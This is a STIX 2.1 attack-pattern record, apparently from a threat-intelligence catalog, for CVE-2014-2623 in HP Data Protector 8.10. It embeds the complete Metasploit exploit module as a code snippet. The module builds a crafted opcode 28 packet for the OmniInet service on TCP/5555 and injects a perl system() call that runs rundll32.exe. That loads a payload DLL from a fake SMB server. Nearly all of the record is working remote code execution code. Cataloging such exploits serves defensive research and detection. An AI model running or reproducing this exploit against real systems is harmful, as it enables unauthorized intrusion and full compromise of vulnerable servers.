{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--058f1741-ebdb-4f52-95d2-010d07c23196",
    "created": "2024-08-14T16:46:09.341084Z",
    "modified": "2024-08-14T16:46:09.341088Z",
    "name": "HP Data Protector 8.10 Remote Command Execution",
    "description": " This module exploits a remote command execution on HP Data Protector 8.10. Arbitrary commands can be executed by sending crafted requests with opcode 28 to the OmniInet service listening on the TCP/5555 port. Since there is a strict length limitation on the command, rundll32.exe is executed, and the payload is provided through a DLL by a fake SMB server. This module has been tested successfully on HP Data Protector 8.1 on Windows 7 SP1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_dataprotector_cmd_exec.rb",
            "external_id": "hp_dataprotector_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2623"
        },
        {
            "source_name": "reference",
            "url": "https://h20564.www2.hp.com/hpsc/doc/public/display?docId=emr_na-c04373818"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::SMB::Server::Share\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'HP Data Protector 8.10 Remote Command Execution',\n      'Description'    => %q{\n        This module exploits a remote command execution on HP Data Protector 8.10. Arbitrary\n        commands can be executed by sending crafted requests with opcode 28 to the OmniInet\n        service listening on the TCP/5555 port. Since there is a strict length limitation on\n        the command, rundll32.exe is executed, and the payload is provided through a DLL by a\n        fake SMB server. This module has been tested successfully on HP Data Protector 8.1 on\n        Windows 7 SP1.\n      },\n      'Author'         => [\n        'Christian Ramirez', # POC\n        'Henoch Barrera', # POC\n        'Matthew Hall <hallm[at]sec-1.com>' # Metasploit Module\n      ],\n      'References'     =>\n        [\n          ['CVE', '2014-2623'],\n          ['OSVDB', '109069'],\n          ['EDB', '34066'],\n          ['URL', 'https://h20564.www2.hp.com/hpsc/doc/public/display?docId=emr_na-c04373818']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'       => 2048,\n          'DisableNops' => true\n        },\n      'Privileged'     => true,\n      'Platform'       => 'win',\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Targets'        =>\n        [\n          [ 'HP Data Protector 8.10 / Windows', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-11-02'))\n\n      register_options(\n        [\n          Opt::RPORT(5555),\n          OptString.new('FILE_NAME', [ false, 'DLL File name to share']),\n          OptInt.new('SMB_DELAY', [true, 'Time that the SMB Server will wait for the payload request', 15])\n        ])\n\n      deregister_options('FOLDER_NAME')\n      deregister_options('FILE_CONTENTS')\n  end\n\n  def check\n    fingerprint = get_fingerprint\n\n    if fingerprint.nil?\n      return Exploit::CheckCode::Unknown\n    end\n\n    print_status(\"HP Data Protector version #{fingerprint}\")\n\n    if fingerprint =~ /HP Data Protector A\\.08\\.(\\d+)/\n      minor = $1.to_i\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n    if minor < 11\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Detected\n  end\n\n\n  def get_fingerprint\n    ommni = connect\n    ommni.put(rand_text_alpha_upper(64))\n    resp = ommni.get_once(-1)\n    disconnect\n\n    if resp.nil?\n      return nil\n    end\n\n    Rex::Text.to_ascii(resp).chop.chomp # Delete unicode last null\n  end\n\n  def send_pkt(cmd)\n    cmd.gsub!(\"\\\\\", \"\\\\\\\\\\\\\\\\\")\n\n    pkt = \"2\\x00\"\n    pkt << \"\\x01\\x01\\x01\\x01\\x01\\x01\\x00\"\n    pkt << \"\\x01\\x00\"\n    pkt << \"\\x01\\x00\"\n    pkt << \"\\x01\\x00\"\n    pkt << \"\\x01\\x01\\x00 \"\n    pkt << \"28\\x00\"\n    pkt << \"\\\\perl.exe\\x00 \"\n    pkt << \"-esystem('#{cmd}')\\x00\"\n\n    connect\n    sock.put([pkt.length].pack('N') + pkt)\n    disconnect\n  end\n\n  def primer\n    self.file_contents = generate_payload_dll\n    print_status(\"File available on #{unc}...\")\n\n    print_status(\"Trying to execute remote DLL...\")\n    sploit = \"rundll32.exe #{unc},#{rand_text_numeric(1)}\"\n    send_pkt(sploit)\n  end\n\n  def setup\n    super\n\n    self.file_name = datastore['FILE_NAME'] || \"#{Rex::Text.rand_text_alpha(4 + rand(3))}.dll\"\n\n    unless file_name =~ /\\.dll$/\n      fail_with(Failure::BadConfig, \"FILE_NAME must end with .dll\")\n    end\n  end\n\n  def exploit\n    begin\n      Timeout.timeout(datastore['SMB_DELAY']) {super}\n    rescue Timeout::Error\n      # do nothing... just finish exploit and stop smb server...\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-02",
    "x_mitre_platforms": [
        "win'"
    ]
}